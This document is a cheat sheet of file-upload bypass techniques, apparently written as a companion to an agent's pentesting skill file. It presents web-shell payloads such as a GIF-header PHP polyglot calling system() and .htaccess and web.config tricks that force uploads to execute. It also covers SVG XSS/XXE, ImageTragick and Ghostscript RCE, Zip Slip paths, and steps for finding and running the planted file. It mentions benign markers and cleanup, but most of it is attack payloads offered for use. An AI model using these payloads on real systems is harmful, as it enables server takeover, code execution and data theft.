# File upload bypass cheat sheet

Companion to `SKILL.md`. Layer the bypasses — extension × content-type × magic bytes × content —
and confirm where the file lands and whether it executes. Don't conclude "blocked" after one `.php`.

## Extension tricks (when extension is filtered)
```
double        shell.php.jpg      shell.jpg.php
case          shell.PhP  shell.pHtml
alt PHP exts  .php3 .php4 .php5 .php7 .pht .phtml .phar .phps .pgif  .inc
alt others    .asp .aspx .asa .cer .ashx (IIS) | .jsp .jspx .jsw .jsv (Java) | .cfm | .pl .cgi
trailing      shell.php%00.jpg (null, old)  shell.php%20  shell.php.  shell.php:::$DATA (NTFS)  shell.php/
double ext +  .jpg.php  where server executes on last known ext
htaccess      upload .htaccess:  AddType application/x-httpd-php .jpg   → then .jpg runs as PHP (Apache)
web.config    IIS: upload web.config to enable handler / execute
```

## Content-Type (MIME) bypass
```
keep the malicious file but set  Content-Type: image/jpeg  (or image/png, application/pdf)
some servers check the multipart Content-Type header, not the bytes — flip it
```

## Magic-byte / content bypass (server sniffs file signature)
```
prepend real magic bytes, then the payload:
  GIF89a;<?php system($_GET[0]); ?>
  \xFF\xD8\xFF\xE0 (JPEG) + payload
  %PDF-1.5 ... <?php ... ?>
polyglot: a valid image that is also valid PHP (see also web-command-injection, payloads)
EXIF: put PHP in an EXIF comment of a real JPEG, upload as .php/.phtml
```

## Image-library / parser abuse (even when "only images" allowed)
```
SVG → XSS/XXE:  <svg onload=alert(document.domain)>  or SVG with XXE (see web-xxe/cheatsheet)
ImageMagick/GraphicsMagick: ImageTragick (MVG/MSL) → RCE via crafted image
Ghostscript (EPS/PDF thumbnailing) → RCE
ffmpeg (HLS/SSRF via crafted media) → file read / SSRF
zip/tar upload → path traversal on extraction (Zip Slip): entry name ../../var/www/html/s.php
```

## Where does it go? (needed for exec)
```
find the stored path/URL (response, or predictable /uploads/<name>); request it back
if names are randomised: look for a returned URL, an id→path mapping, or a listable dir
exec requires: web-served dir + engine enabled there (an upload dir with php_admin_flag off won't run)
```

## Other impact when RCE isn't reachable
```
stored XSS (SVG/HTML/PDF), path traversal in filename (../../ to overwrite files),
DoS (zip bomb, pixel flood), SSRF (server fetches a "URL" you supply), CSV/formula injection.
```

## Verify
Upload a benign marker (`<?php echo 'PWNED-'.md5(1); ?>` or `<svg onload=...>`), fetch it, and show
it executed / rendered. Delete the uploaded artifact afterward (house rule: clean up).

## References
PayloadsAllTheThings (Upload Insecure Files); PortSwigger file upload labs; ImageTragick; Zip Slip.
